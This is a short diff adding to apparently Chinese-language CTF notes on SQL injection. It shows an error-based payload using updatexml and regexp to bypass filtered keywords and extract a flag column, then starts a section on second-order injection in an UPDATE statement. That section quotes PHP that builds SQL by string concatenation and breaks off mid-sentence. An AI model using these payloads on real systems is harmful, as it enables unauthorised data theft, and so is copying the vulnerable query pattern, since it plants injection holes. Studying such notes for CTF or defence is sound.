@@ -117,3 +117,15 @@ and or 被过滤，使用||，&&，^等
 #这里right()函数如果被过滤了，所以用reverse()
 123"||(updatexml(1,concat('~',((select(right(real_flag_1s_here,30))from(users)where(real_flag_1s_here)regexp('^f')))),1))#
 ```
+
+^
+## **update的注入**
+```
+$sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
+
+如果在代码中可知
+update语句中，在update后面有注入，
+即old_address=$row['address']
+可以通过注入修改此时的前面字段的值，如address字段
+将address
+```
